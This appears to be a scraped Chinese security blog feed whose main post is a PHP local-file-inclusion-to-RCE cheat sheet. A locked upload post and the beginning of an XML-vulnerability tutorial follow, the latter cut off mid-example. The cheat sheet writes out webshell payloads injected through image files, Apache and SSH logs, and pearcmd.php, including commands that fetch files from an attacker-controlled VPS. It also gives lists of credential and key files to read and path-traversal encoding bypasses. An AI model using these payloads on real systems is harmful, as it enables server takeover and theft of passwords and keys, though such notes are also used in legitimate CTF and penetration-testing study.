class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 打印字符串（可以用连接符）、数组、对象。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span> 扫描目录下的文件<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span> 返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span> 返回一包含本地数字及货币格式信息的数组<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span> 与current差不多<br>可以执行<span class="hljs-selector-tag">a</span>(<span class="hljs-selector-tag">b</span>(<span class="hljs-built_in">c</span>()))形式时，<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">current</span>(<span class="hljs-built_in">localeconv</span>()))) 读当前目录文件<br></code></pre></td></tr></table></figure><h4 id="2-读取文件函数"><a href="#2-读取文件函数" class="headerlink" title="(2)读取文件函数"></a>(2)读取文件函数</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">file_get_contents</span>() 把整个文件读入一个字符串中<br><span class="hljs-built_in">file</span>() 把整个文件读入一个数组中;<br><span class="hljs-built_in">readfile</span>() 读入一个文件并写入到输出缓冲;<br><span class="hljs-built_in">highlight_file</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">show_source</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">array_flip</span>() 将读取当前目录的键和值进行反转<br><span class="hljs-built_in">array_rand</span>() 随机输出键<br></code></pre></td></tr></table></figure><h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>example：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="图片马getshell"><a href="#图片马getshell" class="headerlink" title="图片马getshell"></a>图片马getshell</h3><p>条件：<br><code>allow_url_include=on</code><br><code>allow_url_fopen=on</code></p><p>图片马内容，会在当前目录下生成shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="临时文件-phpinfo条件竞争getshell、"><a href="#临时文件-phpinfo条件竞争getshell、" class="headerlink" title="临时文件+phpinfo条件竞争getshell、"></a>临时文件+phpinfo条件竞争getshell、</h3><p>基本没遇到过，写个思路以及别人的方法，遇到了再深入</p><p><a href="https://blog.csdn.net/qq_43576303/article/details/119105376">思路</a>：实质上是连续传输很大的字节到服务器导致删除文件有时间差，包含临时的&#x2F;tmp&#x2F;6字节长度文件名php </p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">脚本</a>：python2的脚本</p><h3 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h3><h4 id="apache日志文件"><a href="#apache日志文件" class="headerlink" title="apache日志文件"></a>apache日志文件</h4><p>条件：<br>apache日志文件路径已知，或配置文件路径已知，有可读权限</p><p>先看<code>/etc/init.d/httpd</code>或<code>/etc/httpd/conf/httpd.conf</code>找到log文件路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>payload：<br>?file=/usr/local/apache/logs/error_log<br>?file=/usr/local/apache/logs/access_log<br><br>?file=shell.php<br></code></pre></td></tr></table></figure><h4 id="ssh日志文件"><a href="#ssh日志文件" class="headerlink" title="ssh日志文件"></a>ssh日志文件</h4><p>条件<br>SSH日志路径已知，有可读权限</p><p>将ssh用户名写为php马，ssh自动写入<code>/var/log/auth.log</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@192.168.136.143</span><br><span class="language-xml"></span><br><span class="language-xml">payload：</span><br><span class="language-xml">?file=/var/log/auth.log</span><br></code></pre></td></tr></table></figure><h3 id="Session文件包含getshell"><a href="#Session文件包含getshell" class="headerlink" title="Session文件包含getshell"></a>Session文件包含getshell</h3><p>条件：<br><code>php&gt;=5.4</code><br><code>session.upload_progress.enable = on</code><br>已知<code>session.save_path</code></p><p>分为两种</p><ol><li>session.upload_progress.cleanup &#x3D; on</li></ol><p>文件会清空，需要条件竞争</p><ol><li>session.upload_progress.cleanup &#x3D; off</li></ol><p>文件不会清空，直接包含<code>session.save_path+session.upload_progress.prefix+session_id</code>文件</p><h3 id="pearcmd-php文件包含getshell"><a href="#pearcmd-php文件包含getshell" class="headerlink" title="pearcmd.php文件包含getshell"></a>pearcmd.php文件包含getshell</h3><p>条件<br>安装了pear扩展<br>已知<code>pearcmd.php</code>路径(默认路径是<code>/usr/local/lib/php/pearcmd.php</code>)<br><code>register_argc_argv=on</code>（只有开启了，<code>$_SERVER[&#39;argv&#39;]</code>才会生效。）</p><p>三种方法</p><p>config-create</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p>install</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+install+</span>--installroot<span class="hljs-code">+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test.php<br></code></pre></td></tr></table></figure><p>download</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+download+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&amp;file=/usr/local/lib/php/pearcmd.php<br></code></pre></td></tr></table></figure><p>具体参考：<a href="https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html">pearcmd文件包含getshell</a></p><h2 id="文件读取利用"><a href="#文件读取利用" class="headerlink" title="文件读取利用"></a>文件读取利用</h2><h3 id="常见读取的敏感文件路径"><a href="#常见读取的敏感文件路径" class="headerlink" title="常见读取的敏感文件路径"></a>常见读取的敏感文件路径</h3><p>参考<a href="https://www.buaq.net/go-161450.html">https://www.buaq.net/go-161450.html</a></p><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Plain">C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息<br></code></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/authorized_keys /</span><span class="hljs-operator">/</span>如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa /</span><span class="hljs-operator">/</span>ssh私钥,ssh公钥是id_rsa.pub<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_ras.keystore /</span><span class="hljs-operator">/</span>记录每个访问计算机用户的公钥<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/known_hosts  /</span><span class="hljs-regexp">/ssh会把每个访问过计算机的公钥(public key)都记录在~/</span>.ssh<span class="hljs-operator">/</span>known_hosts<span class="hljs-operator">。</span>当下次访问相同计算机时，<span class="hljs-type">OpenSSH会核对公钥</span><span class="hljs-operator">。</span>如果公钥不同，<span class="hljs-type">OpenSSH会发出警告，</span> 避免你受到<span class="hljs-type">DNS</span> <span class="hljs-type">Hijack之类的攻击</span><span class="hljs-operator">。</span><br><span class="hljs-regexp">/etc/</span>passwd <span class="hljs-comment">// 账户信息</span><br><span class="hljs-regexp">/etc/</span>shadow <span class="hljs-comment">// 账户密码文件</span><br><span class="hljs-regexp">/etc/</span>my.cnf <span class="hljs-comment">//mysql 配置文件</span><br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf <span class="hljs-comment">// Apache配置文件</span><br><span class="hljs-regexp">/etc/</span>redhat<span class="hljs-operator">-</span>release 系统版本 <br><span class="hljs-regexp">/root/</span>.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br><span class="hljs-regexp">/root/</span>.mysql_history <span class="hljs-comment">//mysql历史命令记录文件</span><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mlocate/</span>mlocate.db <span class="hljs-comment">//全文件路径</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/fd/</span>fd[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">*</span>(文件标识符)<br><span class="hljs-regexp">/proc/</span>mounts <span class="hljs-comment">//记录系统挂载设备</span><br><span class="hljs-regexp">/porc/</span>config.gz <span class="hljs-comment">//内核配置文件</span><br><span class="hljs-regexp">/porc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/cmdline /</span><span class="hljs-operator">/</span>当前进程的cmdline参数<br><span class="hljs-regexp">/proc/</span>sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid<br><span class="hljs-regexp">/proc/</span>pid<span class="hljs-operator">/</span>cmdline   则可以看到对应pid进程的完整命令行<span class="hljs-operator">。</span><br><span class="hljs-regexp">/proc/</span>net<span class="hljs-operator">/</span>fib_trie   内网<span class="hljs-type">IP</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>environ   环境变量<br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>loginuid   当前用户<br></code></pre></td></tr></table></figure><h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><p>可以进行fuzz</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">url编码代替.或者/，如使用<span class="hljs-variable">%2</span>F代替/<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>二次编码(<span class="hljs-variable">%25</span>)<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>加入+<br>?filename<span class="hljs-operator">=</span>.+./.+./bin/redacted.dll<br><span class="hljs-variable">%00</span><br>?filename<span class="hljs-operator">=</span>.<span class="hljs-variable">%00</span>./file.php/etc/passwd<span class="hljs-variable">%00</span>.jpg<br>\<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>/windows/win.iniJava <br><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span> 安全模式绕过<br>?filename<span class="hljs-operator">=</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/etc/passwd<br></code></pre></td></tr></table></figure><h3 id="Linux下的常见利用姿势"><a href="#Linux下的常见利用姿势" class="headerlink" title="Linux下的常见利用姿势"></a>Linux下的常见利用姿势</h3><h4 id="用户目录下的敏感文件"><a href="#用户目录下的敏感文件" class="headerlink" title="用户目录下的敏感文件"></a>用户目录下的敏感文件</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.bash_history</span> <br><span class="hljs-string">.zsh_history</span><br><span class="hljs-string">.psql_history</span><br><span class="hljs-string">.mysql_history</span><br><span class="hljs-string">.profile</span> <br><span class="hljs-string">.bashrc</span><br><span class="hljs-string">.gitconfig</span><br><span class="hljs-string">.viminfo</span><br><br>任意文件读取<span class="hljs-string">/etc/passwd</span><br>提取passwd第一列，即root等一系列用户名<br>读<span class="hljs-keyword">history</span>：<span class="hljs-string">/root/.bash_history</span><br>暴破所有用户的<span class="hljs-string">.bash_history</span>：<span class="hljs-string">/home/</span>§root§<span class="hljs-string">/.bash_history</span><br></code></pre></td></tr></table></figure><p>历史命令重点关注出现的密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径等等，可进一步读取或利用。 PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。</p><h4 id="全路径"><a href="#全路径" class="headerlink" title="全路径"></a>全路径</h4><p>mlocate.db数据库里存储了本地所有文件的配置信息<br><code>/var/lib/mlocate/mlocate.db</code>利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息<br><code>locate mlocate.db config</code><br><code>locate mlocate.db webapps</code><br><code>locate mlocate.db www</code> </p><p>获取到路径后可以进一步挖掘敏感信息和系统漏洞</p><h4 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h4><p>利用全路径或者其他地方获取到的路径读取一些关键的程序源码。读取WEB-INF&#x2F;web.xml，进一步读取class文件，反编译得到源码。读取war包，反编译获取源码。</p><h4 id="应用配置文件"><a href="#应用配置文件" class="headerlink" title="应用配置文件"></a>应用配置文件</h4><p>获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。</p><ul><li>java站点<br><code>/WEB-INF/web.xml</code><br><code>/WEB-INF/classes/applicationContext.xml</code><br> <code>/WEB-INF/classes/xxx/xxx/xxx.class</code><br><code>core.jar</code>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li><li>tomcat<br><code>/usr/local/tomcat/conf/tomcat-users.xml</code></li><li>nginx<br><code>/www/nginx/conf/nginx.conf</code> <code>/etc/nginx/nginx.conf</code> <code>/usr/local/nginx/conf/nginx.conf</code> <code>/usr/local/etc/nginx/nginx.conf</code></li><li>apache<br><code>/etc/httpd/conf/httpd.conf</code> <code>/etc/apache2/apache2.conf</code> <code>/etc/apache2/httpd.conf</code></li><li>redis<br><code>/etc/redis.conf</code></li><li>ssh<br><code>/etc/ssh/sshd_config</code></li></ul><h4 id="应用日志文件"><a href="#应用日志文件" class="headerlink" title="应用日志文件"></a>应用日志文件</h4><p>利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。</p><ul><li>tomcat 可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径 <code>/webapps/ROOT/logs/catalina.out</code></li><li>apache<br> <code>/var/log/apache2/access.log</code><br><code>/var/log/apache2/error.log</code><br><code>/var/log/httpd/access_log</code><br><code>/etc/httpd/logs/access_log</code><br><code>/etc/httpd/logs/error_log</code><br><code>/etc/httpd/logs/error.log</code></li><li>nginx<br><code>/var/log/nginx/access.log</code><br><code>/var/log/nginx/error.log</code><br><code>/usr/local/var/log/nginx/access.log</code><br><code>/usr/local/nginx/logs</code></li></ul><h3 id="Windows下的利用姿势"><a href="#Windows下的利用姿势" class="headerlink" title="Windows下的利用姿势"></a>Windows下的利用姿势</h3><h4 id="盲读取桌面文件"><a href="#盲读取桌面文件" class="headerlink" title="盲读取桌面文件"></a>盲读取桌面文件</h4><p>fuzz桌面文件，比如1.txt、2.txt、密码.txt、pass.txt、password.txt等。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件包含</tag>
      
      <tag>lfi</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/01/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/01/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误。" data-whm="此文章不能被修改。">  <script id="hbeData" type="hbeData" data-hmacdigest="1d51a04eea9d6e1cb4aa5d99e95b9e56f06fcac4b0ac17ce1a7d2d4f8266e468"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">本文参考了他人的文章但找不到出处，故加密。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XML漏洞</title>
    <link href="/2023/01/01/XML%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/01/XML%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="XML漏洞"><a href="#XML漏洞" class="headerlink" title="XML漏洞"></a>XML漏洞</h1><h2 id="XML格式"><a href="#XML格式" class="headerlink" title="XML格式"></a>XML格式</h2><blockquote><p>XML被设计用来传输和存储数据，其焦点是数据的内容。</p></blockquote><p>首先了解XML(可扩展标记语言)<br> 基本格式（内部DTD）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;                              &lt;!--xml文件的声明--&gt;<br>&lt;!DOCTYPE note [                                   &lt;!--定义此文档是 note 类型的文档--&gt;<br>&lt;!ELEMENT note (to,from,heading,body)&gt;             &lt;!--定义note元素有四个元素--&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;                            &lt;!--定义to元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;                          &lt;!--定义from元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT head (#PCDATA)&gt;                          &lt;!--定义head元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;                          &lt;!--定义body元素为”#PCDATA”类型--&gt;<br>]&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><p>总的来说</p><p>第一部分：XML声明</p><p>第二部分：文档类型定义DTD   &#x2F;&#x2F;漏洞一般在此出现</p><p>第三部分：文档元素</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><blockquote><p>DTD：用来约束XML文档定义语义约束分类</p></blockquote><h3 id="内部DTD"><a href="#内部DTD" class="headerlink" title="内部DTD"></a>内部DTD</h3><h3 id="外部DTD"><a href="#外部DTD" class="headerlink" title="外部DTD"></a>外部DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;<br><br>example:<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br><br></code></pre></td></tr></table></figure><h3 id="公共DTD"><a href="#公共DTD" class="headerlink" title="公共DTD"></a>公共DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p></blockquote><p>按实体有无参分类</p><h3 id="一般实体"><a href="#一般实体" class="headerlink" title="一般实体"></a><strong>一般实体</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>&amp;实体名称;<br></code></pre></td></tr></table></figure><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>%实体名称;<br></code></pre></td></tr></table></figure><p>按实体使用方式分类</p><pre><code class="hljs">1. 内部实体</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ol start="2"><li>外部实体</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><p>根据不同语言有以下可支持的协议：</p><p><img src="/img/XML%E6%BC%8F%E6%B4%9E_img/clip_image002-16969084628491.gif" alt="img"></p><h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>与sql闭合类似，闭合标签达到更改、添加数据的效果</p><p>前提条件</p><pre><code class="hljs">1. 用户能够控制数据的输入1. 程序有拼凑的数据</code></pre><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>test.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span 